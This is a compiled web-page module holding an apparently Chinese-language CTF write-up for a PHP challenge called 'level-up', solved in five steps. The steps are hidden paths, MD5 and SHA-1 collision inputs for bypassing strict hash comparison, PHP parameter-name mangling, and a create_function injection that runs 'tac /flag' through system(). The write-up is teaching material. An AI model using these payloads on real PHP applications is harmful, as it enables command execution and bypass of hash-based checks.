import{_ as e,o as a,c as l,e as d}from"./app-bd32c210.js";const t={},i=d(`<p>#PHP #MD5</p><h3 id="level-1" tabindex="-1"><a class="header-anchor" href="#level-1" aria-hidden="true">#</a> level 1</h3><p>查看页面源代码</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>nothing here
<span class="token comment">&lt;!-- here is level 1 --&gt;</span>
<span class="token comment">&lt;!-- disallow: --&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>想到 robots.txt 于是可以得到 \`level_2_1s_h3re.php</p><h3 id="level-2" tabindex="-1"><a class="header-anchor" href="#level-2" aria-hidden="true">#</a> level 2</h3><p>强判断的 md5 的绕过 直接用 md5 碰撞</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>array1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2
&amp;array2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>得到 <code>Level___3.php</code></p><h3 id="level-3" tabindex="-1"><a class="header-anchor" href="#level-3" aria-hidden="true">#</a> level 3</h3><p>哈希强比较</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>得到<code>level_level_4.php</code></p><h3 id="level-4" tabindex="-1"><a class="header-anchor" href="#level-4" aria-hidden="true">#</a> level 4</h3><p>parse_url 的解析缺陷</p><p>在 php 中变量名字是由数字字母和下划线组成的，所以不论用 post 还是 get 传入变量名的时候都将空格、+、点、<code>[</code> 转换为下划线， <code>?NI+SA+=txw4ever</code> 得到<code>55_5_55.php</code></p><h3 id="level-5" tabindex="-1"><a class="header-anchor" href="#level-5" aria-hidden="true">#</a> level 5</h3><p><code>create_function注入</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?a=\\create_function&amp;b=}system(&#39;tac /flag&#39;);//
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,19),n=[i];function F(r,s){return a(),l("div",null,n)}const c=e(t,[["render",F],["__file","level-up.html.vue"]]);export{c as default};
